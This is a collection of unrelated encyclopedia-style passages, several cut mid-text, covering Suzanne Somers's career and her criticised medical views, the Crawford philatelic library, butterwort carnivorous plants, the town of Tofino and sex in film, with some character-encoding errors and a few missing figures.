was allowed by the Superior Court judge and upheld by the Georgia Supreme Court in 2009. This led the Georgia legislature to pass a statute in 2010 making it a crime for a teacher to have sexual relations with a student.

She appeared in the television role of Chrissy Snow on Three's Company and as Carol Foster Lambert on Step by Step. Somers later became the author of a series of self- help books, including Ageless: The Naked Truth About Bioidentical Hormones (2006), about bioidentical hormone replacement therapy. She has released two autobiographies, four diet books, and a book of poetry. Somers has been criticized for her views on some medical subjects and her advocacy of the Wiley Protocol, which has been labelled as \\"scientifically unproven and dangerous\\". Her promotion of alternative cancer treatments has received criticism from the American Cancer Society. Personal life Born Suzanne Marie Mahoney in San Bruno, California, Somers was the third of four children in an Irish-American Catholic family. Her mother, Marion Elizabeth (n√©e Turner), was a medical secretary, and her father, Francis Mahoney, was a laborer and gardener. When Suzanne was six years old her father became an alcoholic. Somers's father would call her names and embarrass her. Somers attended Capuchino High School She also said she was a cheerleader at Mercy High School in Burlingame, California, and was accepted at San Francisco College for Women, a college run by the Catholic Society of the Sacred Heart order. Somers married Bruce Somers in 1965, when she was 19, and they had a son, Bruce Jr., in November 1965. That marriage ended in 1968. Somers became a prize model on Anniversary Game (1969‚Äì70), where she met host Alan Hamel. They married in 1977. Somers has three granddaughters, Camelia, Violet and Daisy Hamel-Buffa. Somers was diagnosed with stage II breast cancer in April 2000, and had a lumpectomy to remove the cancer followed by radiation therapy, but decided to forgo chemotherapy, which doctors prescribe, in favor of a fermented mistletoe extract called Iscador. On January 9, 2007, the Associated Press reported that a wildfire in Southern California had destroyed Somers' Malibu home. Career =Early acting roles= Somers began acting in small roles during the late 1960s and early 1970s (including on various talk shows promoting her book of poetry, and bit parts in movies, such as the \\"Blonde in the white Thunderbird\\" in American Graffiti, and an episode of the American version of the sitcom Lotsa Luck as the femme fatale in the early 1970s). She also appeared in The Rockford Files in 1974 and had an uncredited role as a topless \\"pool girl\\" in Magnum Force in 1973. She also had a guest-starring role on The Six Million Dollar Man, in the 1977 episode \\"Cheshire Project,‚Äù as well as a guest appearance in a 1976 episode of One Day at a Time. She later landed her most famous role of the ditzy blonde \\"Chrissy Snow\\" on the ABC sitcom Three's Company in 1977. Also that year, she was a celebrity panelist on Match Game, and appeared with husband Alan Hamel on Tattletales. =Three's Company= Suzanne Somers on the in 1981, shortly after her departure from Three's Company Somers was cast in the ABC sitcom Three's Company in January 1977. After actresses Suzanne Zenor and Susan Lanier did not impress producers during the first two test pilots, Somers was suggested by ABC president Fred Silverman, who had seen her on the Tonight Show and she was auditioned and hired the day before the taping of the third and final pilot officially commenced. She portrayed Chrissy Snow, a stereotypical dumb blonde, who was employed as an office secretary. The series co-starred John Ritter and Joyce DeWitt in a comedy of errors about two single women living with a single man who pretends to be gay in order to bypass the landlord's policy prohibiting single men sharing an apartment with single women. The program was an instant success in the ratings, eventually spawning a short-lived spin-off series (starring Norman Fell and Audra Lindley). Somers became an audience favorite, with the media proclaiming her the show's breakout star, and leading to her status as a popular sex symbol of the era. She was generally credited for transforming the program into a worldwide phenomenon. When Three's Company began its fifth season in 1980, Somers demanded a hefty salary increase from $30,000 to $150,000 an episode and 10 percent ownership of the show's profits. Those close to the situation suggested that Somers' rebellion was largely due to husband Hamel's influences. After ABC denied her a raise in salary, Somers refused to appear in the second and fourth shows of the season, due to excuses such as a broken rib. She finished the remaining season on her contract, but her role was decreased to just 60 seconds per episode, her character only appearing in the episode's closing tag in which Chrissy calls the trio's apartment from her parents' home. After ABC fired her from the program and terminated her contract, Somers sued the network for $2 million, saying her credibility in show business had been damaged. The lawsuit was settled by an arbitrator who decided Somers was owed $30,000, due to a single missed episode for which she had not been paid. Future rulings also favored the network and producers. Somers says she was fired for asking to be paid as much as popular male television stars of the day such as Alan Alda and Carroll O'Connor. Before the feud with ABC and Three's Company producers had ended, rival network CBS knew that Somers was ultimately going to be available. They signed her to a contract and a development deal for her own sitcom, to be called The Suzanne Somers Show, in which she was to play an \\"over-the-top\\" airline stewardess. Once she was indeed available (after her firing from Three's Company), CBS gave Somers ‚Äì and the public ‚Äì a time frame in which to expect the show to hit the air, but due to a change in administration at CBS' entertainment division in early 1982, executives ended up passing on the project. In her book After the Fall (1998) Somers said the producers of Three's Company kept sending cease and desist forms to CBS stating that Somers could not use any of her Chrissy Snow characterization, which she said chilled the creative process. Somers and her Three's Company co-star John Ritter reconciled their friendship after 20 years of not speaking to each other, shortly before Ritter's death in 2003. =Infomercials= Calling her a legend in the industry, on May 2, 2014, Direct Marketing Response inducted Somers into the infomercial Hall of Fame. =Playboy pictorials= Somers appeared in two Playboy cover-feature nude pictorials, in 1980 and 1984. Her first set of nude photos was taken by Stan Malinowski in February 1970 when Somers was a struggling model and actress and did a test photoshoot for the magazine. She was accepted as a Playmate candidate in 1971, but declined to pose nude before the actual shoot. During an appearance on The Tonight Show, she denied ever posing nude (except for a High Society topless photo), which prompted Playboy to publish photos from the 1970 Malinowski shoot a decade later, in 1980. Somers' original motivation for posing nude was to be able to pay medical bills related to injuries her son Bruce Jr. suffered in a car accident. By the time the photos were published, her son was 14 and Somers feared seeing his mother posing nude would be difficult for him. Somers sued Playboy and settled for $50,000‚Äîwhich was donated to charity, at least $10,000 of it going to the Easter Seals. The second nude pictorial by Richard Fegley appeared in December 1984 in an attempt by Somers to regain her diminished popularity after the Three's Company debacle in 1981. Despite her anger and the earlier lawsuit, Playboy approached her earlier that year to pose nude a second time. Initially she was angered again, but eventually agreed after discussing it with her family. She felt she would have a better chance to control the quality of the photos the second time, and having such control was an important condition that Somers attached to posing. Despite Somers' earlier belief that her son would not want to see his mother nude, her then 18-year-old son did view the second pictorial. =Spokeswoman for the Thighmaster= During the 1980s, Somers became a Las Vegas entertainer. In the early 1990s, she was the spokeswoman in a series of infomercials for the Thighmaster, a piece of exercise equipment that is squeezed between one's thighs. During this period of her career, she also performed for US servicemen overseas.O'Connor, John J., \\"TV: Suzanne Somers Plays for G.I.'s\\", The New York Times, January 3, 1983.Zielsdorf, Bruce E.,\\"Armed Forces 'Salute' Suzanne Somers on Broadway\\" , July 12, 2005. Army Public Affairs (press release) =She's the Sheriff= At the height of her exposure as official spokesperson for Thighmaster infomercials, Somers made her first return to a series, although not on network television. In 1987, she starred in the sitcom She's the Sheriff, which ran in first-run syndication. Somers portrayed a widow with two young kids who decided to fill the shoes of her late husband, a sheriff of a Nevada town. The show ran for two seasons. =Step by Step= In 1990, Somers returned to network TV, appearing in numerous guest roles and made-for-TV movies, mostly for ABC. Her roles in these, including the movie Rich Men, Single Women, attracted the attention of Lorimar Television and Miller-Boyett Productions, who were developing a new sitcom. Somers had starred in the film with Heather Locklear, who inadvertently directed the focus of both production companies to Somers due to Locklear's starring role on Going Places (from Lorimar and Miller/Boyett). For Lorimar, this was asking Somers back, since they alone had produced She's the Sheriff. In September 1991, Somers returned to series TV in the sitcom Step By Step (with Patrick Duffy), which became a success on ABC's youth-oriented TGIF lineup. A week after the premiere of Step By Step, a two-hour biopic of Somers starring the actress herself, entitled Keeping Secrets (based on her first autobiography of the same title), was broadcast on ABC. The movie chronicled Somers' troubled family life and upbringing, along with her subsequent rise to fame. Playing off her rejuvenated career, Somers also launched a daytime talk show in 1994, aptly titled Suzanne Somers, which lasted one season. Step By Step continued on ABC until the end of its sixth season in 1997, whereupon the series moved to CBS that fall for what turned out to be its final season. With her sitcom now airing on CBS, Somers was chosen to co-host the network's revival of Candid Camera with Peter Funt, which began airing later that season. =Candid cohost= From 1997‚Äì99, Somers cohosted the revised Candid Camera show, when CBS chose to bring it back with Peter Funt. Somers stayed for two years before PAX TV renewed the series without her. =The Blonde in the Thunderbird= USO tour performances after performing The Blonde in the Thunderbird for members of the US military and their families. In summer 2005, Somers made her Broadway debut in a one-woman show, The Blonde in the Thunderbird, a collection of stories about her life and career. The show was supposed to run until September, but was cancelled in less than a week after poor reviews and disappointing ticket sales. She blamed the harsh reviews (The New York Times referred to it as \\"...a drab and embarrassing display of emotional exhibitionism masquerading as entertainment\\") and told the New York Post: \\"These men [New York critics] are curmudgeons, and maybe I went too close to the bone for them. I was lying there naked, and they decided to kick me and step on me, just like these visions you see in Iraq.\\" =Breaking Through= In 2012, Somers began an online talk show, Suzanne Somers Breaking Through, at CafeMom. Three of the episodes featured a reunion and reconciliation with former Three's Company co-star Joyce DeWitt; the two had not seen nor spoken to each other in 31 years. Somers and Dewitt briefly discussed John Ritter and how glad they were that they both had spoken to him shortly before Ritter passed away. =The Suzanne Show= In the fall of 2012, the Suzanne Show, hosted by Somers, aired for a 13-episode season on the Lifetime Network. Somers welcomed various guests covering a wide range of topics related to health and fitness. =Dancing with the Stars= On February 24, 2015, Somers was announced as one of the stars participating on the 20th season of Dancing with the Stars. Her partner was professional dancer Tony Dovolani. Somers and Dovolani were eliminated on the fifth week of competition and finished in 9th place. Views on medical subjects Somers supports bioidentical hormone replacement therapy. Her book, Ageless, includes interviews with 16 practitioners of bioidentical hormone therapy, but gives extra discussion to one specific approach, the 'Wiley Protocol'. Somers and T. S. Wiley, the originator of the Wiley Protocol, have been criticized for their advocacy of the Wiley Protocol. A group of seven doctors, all of whom utilize bioidentical hormone therapies to address health issues in women, issued a public letter to Somers and her publisher, Crown, in which they state that the protocol is \\"scientifically unproven and dangerous\\" and cite Wiley's lack of medical and clinical qualifications. The use of bioidentical hormone therapies is a very controversial area of medicine; its efficacy has never been tested and numerous groups have expressed concern over its safety and the misleading claims made by practitioners, which was the subject of an Associated Press article: : \\"The problem, for many doctors: These custom-compounded products are not approved by the Food and Drug Administration. ... Somers, whose hormone regimen involves creams, injections and some 60 supplements daily, got a huge boost earlier this year from Oprah Winfrey. 'Many people write Suzanne off as a quackadoo' Winfrey said when Somers appeared on her show. 'But she just might be a pioneer.' ... Yet Winfrey's tacit support of Somers gave her some of the worst press of her career. 'Crazy Talk,' Newsweek headlined an article on the talk show host earlier this year. Another headline, on Salon.com: 'Oprah's Bad Medicine'.\\" Somers at The Heart Truth's Red Dress Collection Fashion Show (2011) In 2001, Somers was diagnosed with breast cancer. She had a lumpectomy, and radiation, but declined to undergo chemotherapy. In November 2008, Somers announced she was diagnosed with inoperable cancer by six doctors, but she learned a week later that she was misdiagnosed. During this time, she interviewed doctors about cancer treatments and these interviews became the basis of her book, Knockout, about alternative treatments to chemotherapy. In her book Knockout, Somers promotes alternative cancer treatments, for which she was criticized by the American Cancer Society: : \\"The American Cancer Society is concerned. ... 'I am very afraid that people are going to listen to her message and follow what she says and be harmed by it', says Dr. Otis Brawley, the organization's chief medical officer. 'We use current treatments because they've been proven to prolong life. They've gone through a logical, scientific method of evaluation. I don't know if Suzanne Somers even knows there IS a logical, scientific method.' ... More broadly, Brawley is concerned that in the United States, celebrities or sports stars feel they can use their fame to dispense medical advice. 'There's a tendency to oversimplify medical messages.... Well, oversimplification can kill.'\\"Jocelyn Noveck, AP national writer. \\"Suzanne Somers' New Target: Chemotherapy.\\" October 19, 2009 (AP), The Huffington Post She is also opposed to water fluoridation. In January 2013, she suggested that Adam Lanza went on his shooting spree at Sandy Hook Elementary School due to the level of toxins in his diet and the household cleaners he was exposed to.

The Crawford Library is a library of early books about philately formed between 1898 and 1913 by James Lindsay, 26th Earl of Crawford. By the time of his death in 1913, Crawford was thought to have amassed the greatest philatelic library of his time. Today, the library is part of the British Library Philatelic Collections.British Library Philatelic Collections: The Crawford Library Retrieved 13 February 2011. Formation and bequest Crawford was a noted bibliophile long before he became interested in philately. The family library, the \\"Bibliotheca Lindesiana\\" located at Haigh Hall in Haigh near Wigan, had its origins in the sixteenth century and became world-famous among scholars for its scope and the many bibliographies of its stock which exceeded 100,000 volumes.\\"Bibliotheca Lindesiana\\" by John P Chalmers, Journal of Library History, vol. 18, no. 3 (Summer 1983): 322-324. =The Tiffany Library= Not long after 1897, Crawford purchased the library of philatelic literature formed by John K. Tiffany of St. Louis, Missouri, the first president of the American Philatelic Society, and which was thought to be the most complete formed up to that time. Tiffany's library was particularly strong on United States philatelic journals and he was calculated to have 97% of everything published on American philately by the time of his death, including dealer's price lists, society records and even stamp related music. Much of Tiffany's library was included in the work which he produced for the Boston Public Library in 1874 entitled The Philatelical Library. (Free download of The Philatelical Library here.) The Tiffany Library was acquired for Crawford by Charles J. Phillips, then Managing Director of Stanley Gibbons, who viewed it while travelling in America. He informed Crawford that the condition of the library was not good and the price of $10,000 (about ¬£2,000 at the time) was too high but Crawford told him to buy it at that price anyway. The library consisted of 909 bound volumes and 136 unbound as well as an extensive card index to its contents which was valuable in itself.The Earl of Crawford K.T.

It was delivered to Crawford in 39 boxes at his London home of 2 Cavendish Square on 28 June 1901. Phillips charged a 5% commission for the negotiations. After the purchase of the Tiffany Library, Crawford employed Edward Denny Bacon as curator of the collection. Bacon worked from Cavendish Square, sorting and cataloguing the works and he was assiduous in tracking down missing philatelic periodicals with the help of Stanley Gibbons.

This library totalled 39 cases of books with surplus material being donated to the Royal Philatelic Society for their library. =Donation= Crawford was a trustee of the British Museum and following his death on 31 January 1913,Owen Gingerich, \\"Lindsay, James Ludovic, twenty-sixth earl of Crawford and ninth earl of Balcarres (1847‚Äì1913)\\", Oxford Dictionary of National Biography, Oxford University Press, 2004 accessed 15 Feb 2011 the library was donated to the British Museum by a codicil to his Will. The library was received on 17 March 1913. In 1973 it passed to the British Library following a reorganisation. Catalogues In 1911, a catalogue of the library by Edward Denny Bacon was published by the Aberdeen University Press under the title Bibliotheca Lindesiana, Vol VII: A Bibliography of the Writings General, Special and Periodical Forming the Literature of Philately and in 1911 the rights to the work were assigned to the Philatelic Literature Society (PLS). The Society republished the work as The Catalogue of the Philatelic Library of the Earl of Crawford, K.T., a work which won a Large Gold medal at the Postwertzeichen Ausstellung stamp exhibition in Vienna in 1911.Sir Edward Denny Bacon, KCVO (1860-1938): A Short Biographical Sketch by Ron Negus. A supplement to The London Philatelist, Vol.108, December 1999. A supplement to the catalogue was published in 1926 by the PLS and an addenda in the March 1938 edition of The London Philatelist, both by E.D. Bacon. In 1991, a new edition of the catalogue was published by the British Library with shelf marks and marginalia by E.D. Bacon included and a preface by David Beech. Not all the works mentioned in these books are included in the Library, as the original book was a bibliography of all known philatelic works, and not a catalogue of Crawford's library. Preservation In 1985 a major project started to microfilm the library as many of the works were found to have deteriorated with age. This has now been completed. In addition, by February 2011, about 80% of the library had been rebound, with and without conservation work such as deacidification and lamination.

They use sticky, glandular leaves to lure, trap, and digest insects in order to supplement the poor mineral nutrition they obtain from the environment. Of the roughly 80 currently known species, 13 are native to Europe, 9 to North America, and some to northern Asia. The largest number of species is in South and Central America. Etymology The name Pinguicula is derived from a term coined by Conrad Gesner, who in his 1561 work entitled Horti Germaniae commented on the glistening leaves: \\"propter pinguia et tenera folia‚Ä¶\\" (Latin pinguis, \\"fat\\"). The common name \\"butterwort\\" reflects this characteristic. Characteristics The majority of Pinguicula are perennial plants. The only known annuals are P. sharpii, P. takakii, P. crenatiloba, and P. pumila. All species form stemless rosettes. =Habitat= Winter rosette of Pinguicula cyclosecta (non- carnivorous phase) Summer rosette of Pinguicula cyclosecta (carnivorous phase) Butterworts can be divided roughly into two main groups based on the climate in which they grow; each group is then further subdivided based on morphological characteristics. Although these groups are not cladistically supported by genetic studies, these groupings are nonetheless convenient for horticultural purposes. Tropical butterworts either form somewhat compact winter rosettes composed of fleshy leaves or retain carnivorous leaves year- round. They are typically located in regions where water is least seasonally plentiful, as too damp soil conditions can lead to rotting. They are found in areas in which nitrogenous resources are known to be in low levels, infrequent or unavailable, due to acidic soil conditions. Temperate species often form tight buds (called hibernacula) composed of scale-like leaves during a winter dormancy period. During this time the roots (with the exception of P. alpina) and carnivorous leaves wither. Temperate species flower when they form their summer rosettes while tropical species flower at each rosette change. Many butterworts cycle between rosettes composed of carnivorous and non-carnivorous leaves as the seasons change, so these two ecological groupings can be further divided according to their ability to produce different leaves during their growing season. If the growth in the summer is different in size or shape to that in the early spring (for temperate species) or in the winter (tropical species), then plants are considered heterophyllous; whereas uniform growth identifies a homophyllous species. This results in four groupings: *Tropical butterworts: species which do not undergo a winter dormancy but continue to alternately bloom and form rosettes. Heterophyllous tropical species: species that alternate between rosettes of carnivorous leaves during the warm season and compact rosettes of fleshy non-carnivorous leaves during the cool season. Examples include P. moranensis, P. gypsicola, and P. laxifolia. Homophyllous tropical species: these species produce rosettes of carnivorous leaves of roughly uniform size throughout the year, such as P. gigantea. *Temperate butterworts: these plants are native to climate zones with cold winters. They produce a winter-resting bud (hibernaculum) during the winter. Heterophyllous temperate species: species where the vegetative and generative rosettes differ in shape and/or size, as seen in P. lutea and P. lusitanica. Homophyllous temperate species: the vegetative and generative rosettes appear identical, as exhibited by P. alpina, P. grandiflora, and P. vulgaris. =Roots= The root system of Pinguicula species is relatively undeveloped. The thin, white roots serve mainly as an anchor for the plant and to absorb moisture (nutrients are absorbed through carnivory). In temperate species these roots wither (except in P. alpina) when the hibernaculum is formed. In the few epiphytic species (such as P. lignicola), the roots form anchoring suction cups. =Leaves and carnivory= A fly trapped on a butterwort leaf. Glandular hairs are visible The leaf blade of a butterwort is smooth, rigid, and succulent, usually bright green or pinkish in colour. Depending on species, the leaves are between 2 and 30 cm.(1-12\\") long. The leaf shape depends on the species, but is usually roughly obovate, spatulate, or linear. They can also appear yellow in color with a soft feel and a greasy consistency to the leaves.\` Vector graphic of the trapping and digestive features of a Pinguicula leaf Like all members of the family Lentibulariaceae, butterworts are carnivorous. The mechanistic actions that these plants use to lure and capture prey is through a means of sticky or adhesives substances that are produced by mucilage separated by glands located on the leaf‚Äôs surface. In order to catch and digest insects, the leaf of a butterwort uses two specialized glands which are scattered across the leaf surface (usually only on the upper surface, with the exception of P. gigantea and P. longifolia ssp. longifolia). One is termed a peduncular gland, and consists of a few secretory cells on top of a single stalk cell. These cells produce a mucilaginous secretion which forms visible droplets across the leaf surface. This wet appearance probably helps lure prey in search of water (a similar phenomenon is observed in the sundews). The droplets secrete limited amounts of digestive enzymes, and serve mainly to entrap insects. On contact with an insect, the peduncular glands release additional mucilage from special reservoir cells located at the base of their stalks. The insect will begin to struggle, triggering more glands and encasing itself in mucilage. Some species can bend their leaf edges slightly by thigmotropism, bringing additional glands into contact with the trapped insect. The second type of gland found on butterwort leaves are sessile glands which lie flat on the leaf surface. Once the prey is entrapped by the peduncular glands and digestion begins, the initial flow of nitrogen triggers enzyme release by the sessile glands. These enzymes, which include amylase, esterase, phosphatase, protease, and ribonuclease break down the digestible components of the insect body. These fluids are then absorbed back into the leaf surface through cuticular holes, leaving only the chitin exoskeleton of the larger insects on the leaf surface. The holes in the cuticle which allow for this digestive mechanism also pose a challenge for the plant, since they serve as breaks in the cuticle (waxy layer) that protects the plant from desiccation. As a result, most butterworts live in humid environments. Flower of P. vulgaris Butterworts are usually only able to trap small insects and those with large wing surfaces. They can also digest pollen which lands on their leaf surface. The secretory system can only function a single time, so that a particular area of the leaf surface can only be used to digest insects once. = Flowers = The flower of a hybrid butterwort As with almost all carnivorous plants, the flowers of butterworts are held far above the rest of the plant by a long stalk, in order to reduce the probability of trapping potential pollinators. The single, long-lasting flowers are zygomorphic, with two lower lip petals characteristic of the bladderwort family, and a spur extending from the back of the flower. The calyx has five sepals, and the petals are arranged in a two-part lower lip and a three-part upper lip. Most butterwort flowers are blue, violet or white, often suffused with a yellow, greenish or reddish tint. P. laueana and the newly described P. caryophyllacea are unique in having a strikingly red flowers. Butterworts are often cultivated and hybridized primarily for their flowers. The shape and colors of butterwort flowers are distinguishing characteristics which are used to divide the genus into subgenera and to distinguish individual species from one another. = Fruit and seed = The round to egg-shaped seed capsules open when dry into two halves, exposing numerous small (0.5‚Äì1 mm), brown seeds. If moisture is present the silique closes, protecting the seed and opening again upon dryness to allow for wind dispersal. Many species have a net-like pattern on their seed surface to allow them to land on water surfaces without sinking, since many non-epiphytic butterworts grow near water sources. The haploid chromosome number of butterworts is either n = 8 or n = 11 (or a multiple thereof), depending on species. The exception is P. lusitanica, whose chromosome count is n = 6. = Diet = The diet will range depending on the taxonomy and size of the prey due to the plant‚Äôs retention ability. These size limitations are known to be the main element influencing what prey sources this carnivorous plant can access They can also acquire nourishment from pollen and other plant parts that are high in protein, as other plants can become trapped on their leaves, thus, butterworts are both carnivorous and herbivorous plants. The diet consists of several species from the arthropod taxa, majority of their prey are insects that have wings and are able to fly. The luring, retaining, and seizing of prey is the first steps in the feeding procedure for carnivorous plants; the end result of the process is absorption and digestion of nutrients sourced from these food supplies. Pinguicula species do not select their prey, as they passively accumulate them through methods of sticky, adhesive leaves. However, they do have the ability of visual attraction of their colorful leaves, which will increase the likelihood of luring and capturing a specific taxa. Pinguicula capture their food source/ prey by means of the mucilaginous, sticky substances produced by their stalk glands on the top of their leaf. Once the prey has become trapped in the peduncular glands, the sessile glands present will then produce enzymes needed to accomplish digestion and breaking down the digestible regions of the prey for their nutrients; taking in the fluids of the food source by means of cuticular holes present on the leaf‚Äôs surface. = Vegetative propagation = As well as sexual reproduction by seed, many butterworts can reproduce asexually by vegetative reproduction. Many members of the genus form offshoots during or shortly after flowering (e.g., P. vulgaris), which grow into new genetically identical adults. A few other species form new offshoots using stolons (e.g., P. calyptrata, P. vallisneriifolia) while others form plantlets at the leaf margins (e.g., P. heterophylla, P. primuliflora).  Distribution  Pinguicula distribution Butterworts are distributed throughout the northern hemisphere (map). The greatest concentration of species, however, is in humid mountainous regions of Central America (including Mexico) and South America, where populations can be found as far south as Tierra del Fuego. Australia is the only continent without any native butterworts. Butterworts probably originated in Central America, as this is the center of Pinguicula diversity - roughly 50% of butterwort species are found here. The great majority of individual Pinguicula species have a very limited distribution. The two butterwort species with the widest distribution - P. alpina and P. vulgaris - are found throughout much of Europe and North America. Other species found in North America include P. caerulea, P. ionantha, P. lutea, P. macroceras, P. planifolia, P. primuliflora, P. pumila, and P. villosa.  Habitat  P. macroceras ssp. nortensis growing on a wet rock wall in northern California. P. leptoceras in alpine grassland in S√ºdtirol, Italy In general, butterworts grow in nutrient- poor, alkaline soils. Some species have adapted to other soil types, such as acidic peat bogs (ex. P. vulgaris, P. calyptrata, P. lusitanica), soils composed of pure gypsum (P. gypsicola and other Mexican species), or even vertical rock walls (P. ramosa, P. vallisneriifolia, and most of the Mexican species). A few species are epiphytes (P. casabitoana, P. hemiepiphytica, P. lignicola). Many of the Mexican species commonly grow on mossy banks, rock, and roadsides in oak-pine forests. Pinguicula macroceras ssp. nortensis has even been observed growing on hanging dead grasses. P. lutea grows in pine flatwoods. Other species, such as P. vulgaris, grow in fens. Each of these environments is nutrient-poor, allowing butterworts to escape competition from other canopy-forming species, particularly grasses and sedges.Keddy, P.A. 2010. Wetland Ecology: Principles and Conservation (2nd edition). Cambridge University Press, Cambridge, UK. Chapter 5. Butterworts need habitats that are almost constantly moist or wet, at least during their carnivorous growth stage. Many Mexican species lose their carnivorous leaves, and sprout succulent leaves, or die back to onion-like \\"bulbs\\" to survive the winter drought, at which point they can survive in bone-dry conditions. The moisture they need for growing can be supplied by either a high groundwater table, or by high humidity or high precipitation. Unlike many other carnivorous plants that require sunny locations, many butterworts thrive in part-sun or even shady conditions.  Conservation status  The environmental threats faced by various Pinguicula species depend on their location and on how widespread their distribution is. Most endangered are the species which are endemic to small areas, such as P. ramosa, P. casabitoana, and P. fiorii. These populations are threatened primarily by habitat destruction. Wetland destruction has threatened several US species. Most of these are federally listed as either threatened or endangered, and P. ionantha is listed on CITES appendix I, giving it additional protection.  Botanical history  Pinguicula vulgaris, illustration The first mention of butterworts in botanical literature is an entry entitled (\\"lard herb\\") by Vitus Auslasser in his 1479 work on medicinal herbs entitled Macer de Herbarium. The name is still used for butterworts in Tirol, Austria. In 1583, Clusius already distinguished between two forms in his Historia stirpium rariorum per Pannoniam, Austriam: a blue-flowered form (P. vulgaris) and a white-flowered form (Pinguicula alpina). Linnaeus added P. villosa and P. lusitanica when he published his Species Plantarum in 1753. The number of known species rose sharply with the exploration of the new continents in the 19th century; by 1844, 32 species were known. It was only in the late 19th century that the carnivory of this genus began to be studied in detail. In a letter to Asa Gray dated June 3, 1874, Charles Darwin mentioned his early observations of the butterwort's digestive process and insectivorous nature. (See Gray Herbarium of Harvard University (103)). Darwin studied these plants extensively. S. J. Casper's large 1966 monograph of the genus included 46 species, a number which has almost doubled since then. Many exciting discoveries have been made in recent years, especially in Mexico. Another important development in the history of butterworts is the formation of the International Pinguicula Study Group, an organization dedicated to furthering the knowledge of this genus and promoting its popularity in cultivation, in the 1990s.  Uses  Butterworts are widely cultivated by carnivorous plant enthusiasts. The temperate species and many of the Mexican butterworts are relatively easy to grow and have therefore gained relative popularity. Two of the most widely grown plants are the hybrid cultivars Pinguicula √ó 'Sethos' and Pinguicula √ó 'Weser'. Both are crosses of Pinguicula ehlersiae and Pinguicula moranensis, and are employed by commercial orchid nurseries to combat pests. Butterworts also produce a strong bactericide which prevents insects from rotting while they are being digested. According to Linnaeus, this property has long been known by northern Europeans, who applied butterwort leaves to the sores of cattle to promote healing. Additionally, butterwort leaves were used to curdle milk and form a buttermilk-like fermented milk product called (Sweden) and (Norway).  Classification  Pinguicula belong to the Bladderwort family (Lentibulariaceae), along with Utricularia and Genlisea. Siegfried Jost Casper systematically divided them into three subgenera with 15 sections. A detailed study of the phylogenetics of butterworts by Cieslak et al. (2005) found that all of the currently accepted subgenera and many of the sections were polyphyletic. The diagram below gives a more accurate representation of the correct cladogram.

Floatplanes land on the inlet in town. Coastal fog is a common morning phenomenon in the summer, complicating access by air until the weather clears. Tofino is located at the western end of Highway 4 that connects the community with Port Alberni and the population centres on the east coast of Vancouver Island. There are no roads connecting Tofino along the west coast of Vancouver Island, except to the nearby community of Ucluelet. Boat services connect Tofino with coastal communities such as Ahousat and Hot Springs Cove. Wildlife-watching tour boats operate in the area. In October 2015, a whale watching vessel capsized off the coast of Tofino resulting the deaths of 6 passengers. Culture =Festivities and events= Every March, the migration of thousands of grey whales is celebrated with the Pacific Rim Whale Festival. The last weekend of April is the Tofino Shorebird Festival. The first weekend of June brings the Tofino Food and Wine Festival, featuring British Columbia wines and showcasing the creations of Tofino chefs. The end of August brings the Tofino Lantern Festival (voted Tofino's most popular event by Tofino Time Magazine), early September has the week long Race for The Blue Tuna Shoot-Out from 7 ‚Äì 15 September, and mid-September brings \\"Art in the Gardens,\\" a two-day arts and music festival.

Rip Curl Pro Tofino, the official Canadian surfing championship, has been held each year in May, since 2007. =Poole's Land= Between 1988 and 2020, Tofino was home to Poole's Land, an ecovillage and \\"Hippie Commune\\" run on Anarchist principles. The Commune provided free accommodation to seasonal workers who would come to Tofino in the summer months as well as being a centre of counterculture in the region. =Freedom Cove= Located within the Tofino vicinity is the man-made floating Island of Freedom Cove. Constructed by Wayne Adams and Catherine King in 1992, the mostly wooden structure is both home to Adams and King as well as a tourist attraction and an art gallery. Freedom Cove attempts to live as sustainably as possible by such means as by using solar power, recycling waste, composting, drinking rainwater, and eating locally grown or caught food. Climate Pebble of the morning, on Long Beach in late summer, near Tofino The climate is marine west coast (K√∂ppen: Cfb, clearly included in the temperate zone). Precipitation is concentrated in the winter, which is a characteristic of Coastal British Columbia; however, the annual amount of far exceeds nearby areas. By comparison, Victoria, British Columbia, which is located only away, receives only . Proximity to the Pacific Ocean keeps temperatures cool in the summer and mild in the winter. Average high temperatures in the summer and winter are relatively stable and cool, coming in at and , respectively. Compared to the Canadian city of Winnipeg, Manitoba, which rests on a similar latitude, Tofino's average high temperature is cooler in the summer and a whopping warmer in the winter. During the cooler season, there is a lot of precipitation, with in November alone. Nearly all of the precipitation that falls throughout the year is rain, with 203 days with rain and only 7.8 days with snowfall. Due to its location on the westernmost part of Vancouver Island, Tofino faces the Pacific Ocean, unimpeded by any mountains to the west (and therefore not subject to a rain shadow effect like much of the eastern island and the BC interior). Winter cyclonic storms frequently pass over the town deluging it with rain, making it one of the wettest locations in Canada. The month of November alone brings more precipitation to Tofino than that received for an entire year in parts of the BC interior such as Kamloops and Penticton. Like the rest of coastal BC, summer brings relative dryness; even so, it still receives much more summertime precipitation than the interior (which can often be susceptible to drought-like conditions until the onset of autumn). The highest temperature ever recorded in Tofino was on 15 July, 1941. The coldest temperature ever recorded was on 30 January 1969.

Sex in film is the presence of sexuality in a film. Since the development of the medium, the presence in films of any form of sexuality has been controversial. Some films containing sex scenes have been criticized by religious groups or have been banned or the subject of censorship by governments, or both. In countries with a film rating system, films containing sex scenes typically receive a restricted classification. Nudity in film may be regarded as sexual or as non- sexual. An erotic film is usually a film that has an erotic quality that causes the creation of sexual feelings, as well as a philosophical contemplation concerning the aesthetics of sexual desire, sensuality and romantic love. Love scenes, erotic or not, have been present in films since the silent era of cinematography. A pornographic film, on the other hand, is a sex film which does not usually claim any artistic merit. Sex scenes have been presented in many genres of film, although there are some in which it is rare. Many actors and actresses have performed nude or partial nude scenes, or have dressed and behaved in ways considered sexually provocative by contemporary standards at some point in their careers. Terminology Sex in film can be distinguished from a sex film, which usually refers to a pornographic film and sometimes to a sex education film. It should also be distinguished from nudity in film, though nudity can be presented in a sexualized context. For example, nudity in the context of naturism would normally be regarded as non-sexual. Some people distinguish between \\"gratuitous sex\\" and sex scenes which are presented as integral to a film's plot or as part of the character development. Sex scenes are the main feature of pornographic films. In softcore films, sexuality is less explicit. Erotic films are suggestive of sexuality, but need not contain nudity. Production In order to minimize risk and conflict, and because an actor can feel vulnerable shooting a sex scene, agreements are signed prior to filming. Therein, specific terms of each sex scene are negotiated, including details of the sex scenes and the surroundings of the studio when the sex scenes will be shot. These \\"nudity riders\\" are written contracts commonly used by movie and television shows that intend to film sex or nude scenes. These agreements can include very detailed descriptions such as how much the actors have to be nude, i.e. nude or semi- nude, and information on their attire. An agreement may stipulate that while an intimate scene is being shot, only people associated with the scene or material can remain. Also, whether photographs can be taken, and if these are to be used in the promotion of the film. Use of Body doubles, a person replacing the performer, 